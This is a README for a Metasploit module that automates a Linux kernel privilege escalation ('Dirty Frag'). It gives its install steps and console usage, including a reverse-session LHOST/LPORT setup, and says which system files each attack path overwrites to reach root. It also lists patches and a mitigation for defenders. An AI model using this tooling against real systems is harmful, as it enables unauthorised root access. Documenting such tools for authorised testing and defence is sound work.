# DirtyFrag — Metasploit Module (CVE-2026-43284 / CVE-2026-43500)

> **Linux Local Privilege Escalation** — page-cache write-primitive chain  
> Kernel range: ~4.9 → 6.19 (ESP path) · ~6.4 → 6.19 (RxRPC path)

---

## Overview

**Dirty Frag** is a Linux kernel local privilege escalation vulnerability class discovered and
first disclosed by [Hyunwoo Kim (@v4bel)](https://x.com/v4bel) on **2026-05-07**.  
It chains two independent page-cache write primitives to achieve **uid=0** from any unprivileged
user account — without a race condition, without kernel panic on failure, and with a very high
success rate.

This repository contains a **Metasploit Framework module** (`dirtyfrag_lpe.rb`) that wraps the
original PoC (`exp.c`) for use in authorised penetration tests.

| | CVE-2026-43284 (ESP path) | CVE-2026-43500 (RxRPC path) |
|---|---|---|
| **Subsystem** | `xfrm` / ESP-in-UDP | `AF_RXRPC` / rxkad |
| **Primitive** | 4-byte arbitrary page-cache STORE via XFRM ESN replay-state | 8-byte in-place `pcbc(fcrypt)` decrypt at arbitrary file offset |
| **Target** | `/usr/bin/su` page-cache → replaced with root-shell ELF | `/etc/passwd` root entry → empty password field (`::0:0:`) |
| **Prerequisite** | `CLONE_NEWUSER` + `CLONE_NEWNET` (unprivileged userns) | `rxrpc.ko` loaded (default on Ubuntu); no userns needed |
| **Patched in** | [`f4c50a4034e6`](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4) (2026-05-05) | [`aa54b1d27fe0`](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=aa54b1d27fe0c2b78e664a34fd0fdf7cd1960d71) (2026-05-10) |

The module **tries the ESP path first** (instant, single-shot) and **falls back to RxRPC**
if the ESP path is blocked (e.g. AppArmor restricts unprivileged userns creation on Ubuntu).
The two paths cover each other's blind spots, giving full coverage across every major distro.

---

## Repository Layout

```
dirtyfrag-msf/
├── exp.c                # Original PoC — Hyunwoo Kim (@v4bel)
├── dirtyfrag_lpe.rb     # Metasploit module (this project)
└── README.md            # This file
```

> `exp.c` and `dirtyfrag_lpe.rb` must live in **the same directory** — the module reads
> the source file at runtime and uploads it to the target for compilation.

---

## Requirements

### Attacker machine
- Metasploit Framework ≥ 6.3

### Target machine
- Linux x86\_64
- Unpatched kernel (see affected range above)
- `gcc` (or another C compiler) available in `$PATH`
- Write access to `/tmp` (or another writable directory)

---

## Installation

```bash
# 1. Clone this repository
git clone https://github.com/TheSysRat/dirtyfrag-msf.git
cd dirtyfrag-msf

# 2. Copy files to your MSF local modules directory
mkdir -p ~/.msf4/modules/exploits/linux/local/dirtyfrag/
cp dirtyfrag_lpe.rb ~/.msf4/modules/exploits/linux/local/dirtyfrag/
cp exp.c            ~/.msf4/modules/exploits/linux/local/dirtyfrag/

# 3. Reload modules inside msfconsole
msf6 > reload_all
```

Alternatively, point MSF at this directory directly:

```bash
msfconsole -m /path/to/dirtyfrag-msf/
```

---

## Usage

### Basic (Auto mode — recommended)

```
msf6 > use exploit/linux/local/dirtyfrag/dirtyfrag_lpe
msf6 exploit(...) > set SESSION 1
msf6 exploit(...) > set LHOST 10.10.10.10
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > run
```

### Force a specific attack path

```
# ESP path only (requires unprivileged user namespaces)
msf6 exploit(...) > set TARGET 1

# RxRPC path only (Ubuntu — rxrpc.ko default, no userns needed)
msf6 exploit(...) > set TARGET 2
```

---

## Module Options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `SESSION` | Integer | — | **Required.** Existing low-privilege session |
| `WritableDir` | String | `/tmp` | Staging directory on the target |
| `Cleanup` | Boolean | `true` | Drop page cache + delete staged files |
| `Verbose` | Boolean | `false` | Pass `--verbose` to the exploit binary |
| `MaxItersMG` | Integer | `0` | Cap RxRPC brute-force iterations (millions) |
| `CompilerPath` | String | *(auto)* | Override gcc path on target |
| `WfsDelay` | Integer | `300` | Seconds to wait for exploit (increase for RxRPC on slow targets) |

---

## ⚠️ Page Cache Cleanup

After exploitation, the kernel page cache for `/usr/bin/su` or `/etc/passwd` is contaminated.

**The module runs cleanup automatically** (when `Cleanup=true`, the default).  
If the module is interrupted before cleanup, run this **on the target** manually:

```bash
echo 3 > /proc/sys/vm/drop_caches
```

Without cleanup, `/usr/bin/su` will behave as a root shell for any user until the page is naturally evicted, which is a significant system stability and security risk.

---

## Mitigation (for defenders)

Patch your kernel. Until a backport is available for your distribution, the following command
disables the vulnerable modules and flushes the page cache:

```bash
sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' \
  > /etc/modprobe.d/dirtyfrag.conf; \
  rmmod esp4 esp6 rxrpc 2>/dev/null; \
  echo 3 > /proc/sys/vm/drop_caches; true"
```

---

## Credits

| Role | Person |
|------|--------|
| Vulnerability discovery & original PoC | Hyunwoo Kim ([@v4bel](https://x.com/v4bel)) |
| Metasploit module | TheSysRat |

> **This module is provided for authorised penetration testing and security research only.**
